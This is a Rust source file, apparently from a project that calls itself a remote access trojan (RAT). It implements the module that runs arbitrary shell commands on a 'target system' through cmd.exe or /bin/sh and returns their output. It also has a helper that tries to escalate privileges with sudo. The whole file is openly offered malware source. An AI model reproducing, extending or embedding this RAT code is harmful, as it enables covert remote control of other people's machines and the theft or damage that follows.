/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Shell command execution.
//!
//! Executes arbitrary shell commands on the target system and
//! captures their output. This is the bread and butter of any RAT.

use std::process::Command;

/// Executes a shell command and returns its output.
///
/// Uses the appropriate shell for each platform:
/// - Windows: cmd.exe /C
/// - Unix: /bin/sh -c
///
/// # Arguments
/// * `cmd` - The command string to execute
///
/// # Returns
/// Combined stdout and stderr as a string, or error message
///
/// # Example
/// ```
/// let output = execute_command("whoami")?;
/// println!("Current user: {}", output);
/// ```
pub fn execute_command(cmd: &str) -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        // On Windows, use cmd.exe
        Command::new("cmd")
            .args(["/C", cmd])
            .output()
    } else {
        // On Unix-like systems, use sh
        Command::new("sh")
            .args(["-c", cmd])
            .output()
    };

    match output {
        Ok(output) => {
            // Combine stdout and stderr
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            if output.status.success() {
                Ok(stdout.to_string())
            } else {
                // Include both stdout and stderr for failed commands
                Ok(format!(
                    "Exit code: {}\nStdout:\n{}\nStderr:\n{}",
                    output.status.code().unwrap_or(-1),
                    stdout,
                    stderr
                ))
            }
        }
        Err(e) => Err(format!("Failed to execute command: {}", e)),
    }
}

/// Executes a command with elevated privileges (if possible).
///
/// On Windows, this would use runas.
/// On Unix, this would prepend sudo (may require password).
///
/// # Note
/// This is included for completeness but may not work without
/// user interaction or stored credentials.
pub fn execute_elevated(cmd: &str) -> Result<String, String> {
    if cfg!(target_os = "windows") {
        // Windows elevation requires UAC prompt - not silent
        Err("Elevated execution requires UAC prompt on Windows".to_string())
    } else {
        // Try with sudo - will fail if not in sudoers with NOPASSWD
        execute_command(&format!("sudo {}", cmd))
    }
}
